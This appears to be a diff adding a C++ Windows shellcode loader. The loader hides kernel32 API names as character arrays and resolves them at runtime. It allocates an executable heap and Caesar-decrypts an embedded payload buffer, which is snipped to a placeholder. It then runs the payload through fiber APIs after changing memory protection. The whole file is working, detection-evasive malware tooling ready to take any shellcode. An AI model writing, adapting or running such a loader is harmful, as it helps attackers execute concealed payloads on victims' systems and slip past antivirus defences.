@@ -1,0 +1,86 @@
+#include <iostream>
+#include <Windows.h>
+
+typedef BOOL(WINAPI* pfnVirtualProtect)(
+    IN  LPVOID lpAddress,
+    IN  SIZE_T dwSize,
+    IN  DWORD  flNewProtect,
+    OUT PDWORD lpflOldProtect
+    );
+
+typedef LPVOID(WINAPI* pfnCreateFiber)(
+    IN          SIZE_T                dwStackSize,
+    IN          LPFIBER_START_ROUTINE lpStartAddress,
+    IN OPTIONAL LPVOID                lpParameter
+    );
+
+typedef void (WINAPI* pfnSwitchToFiber)(
+    IN OPTIONAL LPVOID lpParameter
+    );
+
+typedef LPVOID(WINAPI* pfnConvertThreadToFiber)(
+    IN OPTIONAL LPVOID lpParameter
+    );
+
+typedef HANDLE(WINAPI* pfnHeapCreate)(
+    IN DWORD    flOptions,
+    IN SIZE_T   dwInitialSize,
+    IN SIZE_T   dwMaximumSize
+    );
+
+typedef LPVOID(WINAPI* pfnHeapAlloc)(
+    IN  HANDLE  hHandle,
+    IN  DWORD   dwFlags,
+    IN  SIZE_T  dwBytes
+    );
+
+typedef void(__stdcall* pfnSleep)(DWORD dwMilliseconds);
+
+WCHAR k32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+char strCreateFiber[] = { 'C','r','e','a','t','e','F','i','b','e','r', 0x0 };
+
+char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
+char strSwitchToFiber[] = { 'S','w','i','t','c','h','T','o','F','i','b','e','r', 0x0 };
+char strConvertThreadToFiber[] = { 'C','o','n','v','e','r','t','T','h','r','e','a','d','T','o','F','i','b','e','r', 0x0 };
+char strHeapAlloc[] = { 'H','e','a','p','A','l','l','o','c', 0x0 };
+char strHeapCreate[] = { 'H','e','a','p','C','r','e','a','t','e', 0x0 };
+char strSleep[] = { 'S','l','e','e','p', 0x0 };
+
+pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strVirtualProtect);
+pfnCreateFiber pCreateFiber = (pfnCreateFiber)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strCreateFiber);
+pfnSwitchToFiber pSwitchToFiber = (pfnSwitchToFiber)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strSwitchToFiber);
+pfnConvertThreadToFiber pConvertThreadToFiber = (pfnConvertThreadToFiber)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strConvertThreadToFiber);
+pfnHeapCreate pHeapCreate = (pfnHeapCreate)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strHeapCreate);
+pfnHeapAlloc pHeapAlloc = (pfnHeapAlloc)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strHeapAlloc);
+pfnSleep pSleep = (pfnSleep)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strSleep);
+
+unsigned char buf[] = "\x73\xae\x17\x53\x73\xae\x0f\x1b";  // <snip payload buffer>
+SIZE_T bufSize = sizeof(buf);
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
+    LPVOID cFiber = NULL;
+    LPVOID hAlloc = NULL;
+
+    // Convert current thread to fiber
+    LPVOID ThreadToFiber = pConvertThreadToFiber(NULL);
+
+    PVOID hHandle = pHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 2048);
+    hAlloc = pHeapAlloc(hHandle, HEAP_ZERO_MEMORY, bufSize);
+
+    // Caesar decryption
+    for (int i = 0; i < bufSize; i++) {
+        buf[i] = (unsigned char)(((unsigned int)buf[i] - 0x13) & 0xFF);  // Adjust SEED value as needed
+    }
+
+    memmove_s(hAlloc, bufSize, buf, bufSize);
+
+    cFiber = pCreateFiber(NULL, (LPFIBER_START_ROUTINE)hAlloc, NULL);
+    if (cFiber == NULL) { return -2; }
+
+    DWORD oldProtection = 0;
+    if (!pVirtualProtect(hAlloc, bufSize, PAGE_EXECUTE, &oldProtection)) { return -2; };
+
+    pSwitchToFiber(cFiber);
+
+    return 0;
+}
